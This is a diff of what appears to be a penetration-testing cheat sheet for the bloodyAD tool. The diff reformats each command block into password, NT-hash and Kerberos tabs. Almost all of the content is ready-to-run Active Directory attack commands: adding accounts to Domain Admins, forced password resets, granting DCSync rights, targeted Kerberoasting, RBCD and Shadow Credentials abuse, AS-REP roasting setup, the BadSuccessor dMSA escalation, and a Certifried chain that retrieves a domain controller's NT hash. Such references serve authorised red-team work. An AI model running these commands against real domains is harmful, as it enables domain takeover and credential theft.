+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      remove groupMember "Domain Admins" $TARGET
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Add a user to a group
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      add groupMember "Domain Admins" $TARGET
+
+    # Remove after abuse (clean up is important in real engagements)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      remove groupMember "Domain Admins" $TARGET
+    ```
+  </Tab>
+</Tabs>
 
 ### Password Reset
 
 Exploits ForceChangePassword or GenericAll rights. No knowledge of the current password is required.
 
-```bash wrap
-# Change target user's password
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  set password $TARGET 'NewPassword123!'
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Change target user's password
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      set password $TARGET 'NewPassword123!'
 
-# Change a computer account's password (useful after gaining GenericAll on machine account)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  set password 'WORKSTATION$' 'NewComputerPass123!'
-```
+    # Change a computer account's password (useful after gaining GenericAll on machine account)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      set password 'WORKSTATION$' 'NewComputerPass123!'
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Change target user's password
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      set password $TARGET 'NewPassword123!'
+
+    # Change a computer account's password (useful after gaining GenericAll on machine account)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      set password 'WORKSTATION$' 'NewComputerPass123!'
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Change target user's password
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      set password $TARGET 'NewPassword123!'
+
+    # Change a computer account's password (useful after gaining GenericAll on machine account)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      set password 'WORKSTATION$' 'NewComputerPass123!'
+    ```
+  </Tab>
+</Tabs>
 
 ### Ownership
 
 Taking ownership of an object lets you then grant yourself any rights via WriteDacl. Requires WriteOwner on the target.
 
-```bash wrap
-# Set yourself as owner of a target object
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  set owner $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Set yourself as owner of a target object
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      set owner $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Set yourself as owner of a target object
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      set owner $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Set yourself as owner of a target object
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      set owner $TARGET "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+    ```
+  </Tab>
+</Tabs>
 
 ### DCSync Rights
 
 DCSync requires the Replicating Directory Changes and Replicating Directory Changes All extended rights on the domain root. If you have WriteDacl on the domain object, you can grant yourself these.
 
-```bash wrap
-# Grant DCSync rights to a user
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  add dcsync "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Grant DCSync rights to a user
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      add dcsync "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
 
-# Remove after dumping NTDS
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  remove dcsync "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
-```
+    # Remove after dumping NTDS
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      remove dcsync "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Grant DCSync rights to a user
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      add dcsync "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+
+    # Remove after dumping NTDS
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      remove dcsync "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Grant DCSync rights to a user
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      add dcsync "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+
+    # Remove after dumping NTDS
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      remove dcsync "CN=$USER,CN=Users,DC=$DOMAIN,DC=local"
+    ```
+  </Tab>
+</Tabs>
 
 ### Generic Attribute Write
 
 `set object` writes any writable LDAP attribute directly. Use it for targeted Kerberoasting by adding an SPN to a user, or to clear attributes after abuse.
 
-```bash wrap
-# Add an SPN to a user account to make it Kerberoastable (requires GenericWrite or WriteProperty)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  set object $TARGET servicePrincipalName -v "fake/spn.$DOMAIN"
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Add an SPN to a user account to make it Kerberoastable (requires GenericWrite or WriteProperty)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      set object $TARGET servicePrincipalName -v "fake/spn.$DOMAIN"
 
-# Clear the SPN after roasting the hash
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  set object $TARGET servicePrincipalName -v ''
+    # Clear the SPN after roasting the hash
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      set object $TARGET servicePrincipalName -v ''
 
-# Write any attribute by name and value
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  set object $TARGET description -v 'modified'
+    # Write any attribute by name and value
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      set object $TARGET description -v 'modified'
 
-# Spoof a computer's DNS hostname to match a DC (Certifried / CVE-2022-26923 prerequisite)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  set object 'ATTACKER$' dNSHostName -v "DC01.$DOMAIN"
-```
+    # Spoof a computer's DNS hostname to match a DC (Certifried / CVE-2022-26923 prerequisite)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      set object 'ATTACKER$' dNSHostName -v "DC01.$DOMAIN"
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Add an SPN to a user account to make it Kerberoastable (requires GenericWrite or WriteProperty)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      set object $TARGET servicePrincipalName -v "fake/spn.$DOMAIN"
+
+    # Clear the SPN after roasting the hash
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      set object $TARGET servicePrincipalName -v ''
+
+    # Write any attribute by name and value
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      set object $TARGET description -v 'modified'
+
+    # Spoof a computer's DNS hostname to match a DC (Certifried / CVE-2022-26923 prerequisite)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      set object 'ATTACKER$' dNSHostName -v "DC01.$DOMAIN"
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Add an SPN to a user account to make it Kerberoastable (requires GenericWrite or WriteProperty)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      set object $TARGET servicePrincipalName -v "fake/spn.$DOMAIN"
+
+    # Clear the SPN after roasting the hash
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      set object $TARGET servicePrincipalName -v ''
+
+    # Write any attribute by name and value
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      set object $TARGET description -v 'modified'
+
+    # Spoof a computer's DNS hostname to match a DC (Certifried / CVE-2022-26923 prerequisite)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      set object 'ATTACKER$' dNSHostName -v "DC01.$DOMAIN"
+    ```
+  </Tab>
+</Tabs>
 
 ## Delegation Abuse
 
 RBCD abuse requires write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer. bloodyAD handles the attribute encoding automatically.
 
-```bash wrap
-# Set RBCD: allow EVIL$ to impersonate any user to TARGET$
-# Requires GenericAll, GenericWrite, or WriteProperty on TARGET$
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  add rbcd TARGET$ $COMP_NAME
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Set RBCD: allow EVIL$ to impersonate any user to TARGET$
+    # Requires GenericAll, GenericWrite, or WriteProperty on TARGET$
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      add rbcd TARGET$ $COMP_NAME
 
-# Verify the attribute was written correctly
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get object TARGET$ --attr msDS-AllowedToActOnBehalfOfOtherIdentity
+    # Verify the attribute was written correctly
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get object TARGET$ --attr msDS-AllowedToActOnBehalfOfOtherIdentity
 
-# After exploitation, clean up the attribute
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  remove rbcd TARGET$ $COMP_NAME
-```
+    # After exploitation, clean up the attribute
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      remove rbcd TARGET$ $COMP_NAME
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Set RBCD: allow EVIL$ to impersonate any user to TARGET$
+    # Requires GenericAll, GenericWrite, or WriteProperty on TARGET$
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      add rbcd TARGET$ $COMP_NAME
+
+    # Verify the attribute was written correctly
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get object TARGET$ --attr msDS-AllowedToActOnBehalfOfOtherIdentity
+
+    # After exploitation, clean up the attribute
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      remove rbcd TARGET$ $COMP_NAME
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Set RBCD: allow EVIL$ to impersonate any user to TARGET$
+    # Requires GenericAll, GenericWrite, or WriteProperty on TARGET$
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      add rbcd TARGET$ $COMP_NAME
+
+    # Verify the attribute was written correctly
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get object TARGET$ --attr msDS-AllowedToActOnBehalfOfOtherIdentity
+
+    # After exploitation, clean up the attribute
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      remove rbcd TARGET$ $COMP_NAME
+    ```
+  </Tab>
+</Tabs>
 
 After setting RBCD, use `getST.py` to request the service ticket and then move laterally.
 
@@ -323,20 +837,56 @@ psexec.py -k -no-pass Administrator@TARGET.$DOMAIN
 
 Shadow Credentials abuse the `msDS-KeyCredentialLink` attribute. Adding a Key Credential to a target account allows authentication as that account via PKINIT without knowing its password. Requires GenericAll or WriteProperty on the attribute.
 
-```bash wrap
-# Add shadow credentials to a target user
-# bloodyAD generates the key pair and outputs the PEM files and NT hash automatically
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  add shadowCredentials $TARGET
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Add shadow credentials to a target user
+    # bloodyAD generates the key pair and outputs the PEM files and NT hash automatically
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      add shadowCredentials $TARGET
 
-# Add shadow credentials to a computer account (enables impersonation via RBCD chain)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  add shadowCredentials 'TARGET$'
+    # Add shadow credentials to a computer account (enables impersonation via RBCD chain)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      add shadowCredentials 'TARGET$'
 
-# Remove a specific key credential by its DeviceID (shown in add output)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  remove shadowCredentials $TARGET --key <DeviceID>
-```
+    # Remove a specific key credential by its DeviceID (shown in add output)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      remove shadowCredentials $TARGET --key <DeviceID>
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Add shadow credentials to a target user
+    # bloodyAD generates the key pair and outputs the PEM files and NT hash automatically
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      add shadowCredentials $TARGET
+
+    # Add shadow credentials to a computer account (enables impersonation via RBCD chain)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      add shadowCredentials 'TARGET$'
+
+    # Remove a specific key credential by its DeviceID (shown in add output)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      remove shadowCredentials $TARGET --key <DeviceID>
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Add shadow credentials to a target user
+    # bloodyAD generates the key pair and outputs the PEM files and NT hash automatically
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      add shadowCredentials $TARGET
+
+    # Add shadow credentials to a computer account (enables impersonation via RBCD chain)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      add shadowCredentials 'TARGET$'
+
+    # Remove a specific key credential by its DeviceID (shown in add output)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      remove shadowCredentials $TARGET --key <DeviceID>
+    ```
+  </Tab>
+</Tabs>
 
 The `add shadowCredentials` command outputs the certificate files and NT hash directly. If PKINIT is blocked, use `gettgtpkinit.py` or `Certipy auth` manually with the generated cert.
 
@@ -344,23 +894,65 @@ The `add shadowCredentials` command outputs the certificate files and NT hash di
 
 UAC flags control account behaviour: pre-auth requirements, password expiry, account status, and more. Setting or unsetting these flags requires GenericAll or WriteProperty on the account.
 
-```bash wrap
-# Disable Kerberos pre-authentication on a user (makes it AS-REP roastable)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  add uac $TARGET -f DONT_REQ_PREAUTH
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Disable Kerberos pre-authentication on a user (makes it AS-REP roastable)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      add uac $TARGET -f DONT_REQ_PREAUTH
 
-# Re-enable pre-authentication (clean up)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  remove uac $TARGET -f DONT_REQ_PREAUTH
+    # Re-enable pre-authentication (clean up)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      remove uac $TARGET -f DONT_REQ_PREAUTH
 
-# Set password to never expire on a service account under your control
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  add uac svc_account -f DONT_EXPIRE_PASSWORD
+    # Set password to never expire on a service account under your control
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      add uac svc_account -f DONT_EXPIRE_PASSWORD
 
-# Check current flags after modification
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get object $TARGET --attr userAccountControl
-```
+    # Check current flags after modification
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get object $TARGET --attr userAccountControl
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Disable Kerberos pre-authentication on a user (makes it AS-REP roastable)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      add uac $TARGET -f DONT_REQ_PREAUTH
+
+    # Re-enable pre-authentication (clean up)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      remove uac $TARGET -f DONT_REQ_PREAUTH
+
+    # Set password to never expire on a service account under your control
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      add uac svc_account -f DONT_EXPIRE_PASSWORD
+
+    # Check current flags after modification
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get object $TARGET --attr userAccountControl
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Disable Kerberos pre-authentication on a user (makes it AS-REP roastable)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      add uac $TARGET -f DONT_REQ_PREAUTH
+
+    # Re-enable pre-authentication (clean up)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      remove uac $TARGET -f DONT_REQ_PREAUTH
+
+    # Set password to never expire on a service account under your control
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      add uac svc_account -f DONT_EXPIRE_PASSWORD
+
+    # Check current flags after modification
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get object $TARGET --attr userAccountControl
+    ```
+  </Tab>
+</Tabs>
 
 ## BadSuccessor (Windows Server 2025)
 
@@ -368,20 +960,58 @@ BadSuccessor is a privilege escalation path affecting Windows Server 2025 domain
 
 First confirm the vulnerability exists:
 
-```bash wrap
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap badsuccessor_check
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST msldap badsuccessor_check
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST msldap badsuccessor_check
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST msldap badsuccessor_check
+    ```
+  </Tab>
+</Tabs>
 
 If vulnerable, create a dMSA targeting a privileged account:
 
-```bash wrap
-# Create a dMSA under an OU where you have CreateChild rights
-# -t specifies the principal account whose privileges the dMSA will inherit
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  add badSuccessor evilDMSA \
-  --ou "OU=Workstations,DC=$DOMAIN,DC=local" \
-  -t "CN=Administrator,CN=Users,DC=$DOMAIN,DC=local"
-```
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Create a dMSA under an OU where you have CreateChild rights
+    # -t specifies the principal account whose privileges the dMSA will inherit
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      add badSuccessor evilDMSA \
+      --ou "OU=Workstations,DC=$DOMAIN,DC=local" \
+      -t "CN=Administrator,CN=Users,DC=$DOMAIN,DC=local"
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Create a dMSA under an OU where you have CreateChild rights
+    # -t specifies the principal account whose privileges the dMSA will inherit
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      add badSuccessor evilDMSA \
+      --ou "OU=Workstations,DC=$DOMAIN,DC=local" \
+      -t "CN=Administrator,CN=Users,DC=$DOMAIN,DC=local"
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Create a dMSA under an OU where you have CreateChild rights
+    # -t specifies the principal account whose privileges the dMSA will inherit
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      add badSuccessor evilDMSA \
+      --ou "OU=Workstations,DC=$DOMAIN,DC=local" \
+      -t "CN=Administrator,CN=Users,DC=$DOMAIN,DC=local"
+    ```
+  </Tab>
+</Tabs>
 
 Then authenticate as the dMSA to get a TGT carrying the inherited privileges:
 
@@ -399,60 +1029,197 @@ secretsdump.py -k -no-pass $DOMAIN/evilDMSA@$DC_HOST
 
 These commands cover object creation, deletion, and DNS record manipulation. Computer account creation is commonly needed as a prerequisite for RBCD attacks when MachineAccountQuota is above 0.
 
-```bash wrap
-# Create a new domain user
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  add user newuser 'Password123!'
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Create a new domain user
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      add user newuser 'Password123!'
 
-# Create a computer account (alternative to addcomputer.py for RBCD prereq)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  add computer '$COMP_NAME' $COMP_PASS
+    # Create a computer account (alternative to addcomputer.py for RBCD prereq)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      add computer '$COMP_NAME' $COMP_PASS
 
-# Delete any AD object by distinguished name
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  remove object "CN=$COMP_NAME,CN=Computers,DC=$DOMAIN,DC=local"
+    # Delete any AD object by distinguished name
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      remove object "CN=$COMP_NAME,CN=Computers,DC=$DOMAIN,DC=local"
 
-# Add a DNS A record (useful for MITM or coercion attacks)
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  add dnsRecord attacker-host $LHOST
+    # Add a DNS A record (useful for MITM or coercion attacks)
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      add dnsRecord attacker-host $LHOST
 
-# Remove a DNS record after use
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  remove dnsRecord attacker-host $LHOST
-```
+    # Remove a DNS record after use
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      remove dnsRecord attacker-host $LHOST
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Create a new domain user
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      add user newuser 'Password123!'
+
+    # Create a computer account (alternative to addcomputer.py for RBCD prereq)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      add computer '$COMP_NAME' $COMP_PASS
+
+    # Delete any AD object by distinguished name
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      remove object "CN=$COMP_NAME,CN=Computers,DC=$DOMAIN,DC=local"
+
+    # Add a DNS A record (useful for MITM or coercion attacks)
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      add dnsRecord attacker-host $LHOST
+
+    # Remove a DNS record after use
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      remove dnsRecord attacker-host $LHOST
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Create a new domain user
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      add user newuser 'Password123!'
+
+    # Create a computer account (alternative to addcomputer.py for RBCD prereq)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      add computer '$COMP_NAME' $COMP_PASS
+
+    # Delete any AD object by distinguished name
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      remove object "CN=$COMP_NAME,CN=Computers,DC=$DOMAIN,DC=local"
+
+    # Add a DNS A record (useful for MITM or coercion attacks)
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      add dnsRecord attacker-host $LHOST
+
+    # Remove a DNS record after use
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      remove dnsRecord attacker-host $LHOST
+    ```
+  </Tab>
+</Tabs>
 
 ## Certifried (CVE-2022-26923)
 
 Certifried abuses the fact that the AD CS Machine template uses `dNSHostName` as the certificate subject rather than the machine SID. A low-priv user with `ms-DS-MachineAccountQuota > 0` can create a computer account, set its `dNSHostName` to match a DC, request a Machine cert, and use that cert to set up RBCD against the DC.
 
+**Steps 1-3: Confirm quota, create computer account, and spoof dNSHostName.**
+
+<Tabs>
+  <Tab title="Password">
+    ```bash wrap
+    # Step 1: Confirm you can create machine accounts
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      get object "DC=$DOMAIN,DC=local" --attr ms-DS-MachineAccountQuota
+
+    # Step 2: Create a computer account
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      add computer 'attacker$' $COMP_PASS
+
+    # Step 3: Set its dNSHostName to match the DC
+    bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
+      set object 'attacker$' dNSHostName -v "DC01.$DOMAIN"
+    ```
+  </Tab>
+  <Tab title="NT Hash">
+    ```bash wrap
+    # Step 1: Confirm you can create machine accounts
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      get object "DC=$DOMAIN,DC=local" --attr ms-DS-MachineAccountQuota
+
+    # Step 2: Create a computer account
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      add computer 'attacker$' $COMP_PASS
+
+    # Step 3: Set its dNSHostName to match the DC
+    bloodyAD -u $USER -p "00000000000000000000000000000000:$NTHASH" -d $DOMAIN --host $DC_HOST \
+      set object 'attacker$' dNSHostName -v "DC01.$DOMAIN"
+    ```
+  </Tab>
+  <Tab title="Kerberos">
+    ```bash wrap
+    # Step 1: Confirm you can create machine accounts
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      get object "DC=$DOMAIN,DC=local" --attr ms-DS-MachineAccountQuota
+
+    # Step 2: Create a computer account
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      add computer 'attacker$' $COMP_PASS
+
+    # Step 3: Set its dNSHostName to match the DC
+    bloodyAD -k ccache=/tmp/ticket.ccache -d $DOMAIN --host $DC_HOST \
+      set object 'attacker$' dNSHostName -v "DC01.$DOMAIN"
+    ```
+  </Tab>
+</Tabs>
+
+**Step 4: Request a Machine cert as the spoofed computer via Certipy.**
+
 ```bash wrap
-# Step 1: Confirm you can create machine accounts
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  get object "DC=$DOMAIN,DC=local" --attr ms-DS-MachineAccountQuota
-
-# Step 2: Create a computer account
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  add computer 'attacker$' $COMP_PASS
-
-# Step 3: Set its dNSHostName to match the DC
-bloodyAD -u $USER -p $PASSWORD -d $DOMAIN --host $DC_HOST \
-  set object 'attacker$' dNSHostName -v "DC01.$DOMAIN"
-
 # Step 4: Request a Machine cert as the spoofed computer (via Certipy)
 certipy req -u 'attacker$'@$DOMAIN -p $COMP_PASS \
   -dc-ip $DC_IP -target $CA_HOST -ca $CA -template Machine
+```
 
+**Step 5: Use the cert to authenticate and retrieve the DC's NT hash.**
+
+```bash wrap
 # Step 5: Use the cert to authenticate and retrieve the DC's NT hash
 certipy auth -pfx dc01.pfx -dc-ip $DC_IP
 # If PKINIT unavailable, convert to PEM and auth via Schannel:
 certipy cert -pfx dc01.pfx -out dc01.pem
-bloodyAD -c ":dc01.pem" -u 'DC01$' -d $DOMAIN --host $DC_HOST \
-  get object "DC=$DOMAIN,DC=local" --attr msDS-Behavior-Version
+```
 
-# Step 6: Set RBCD on the DC to impersonate DA via S4U2Proxy
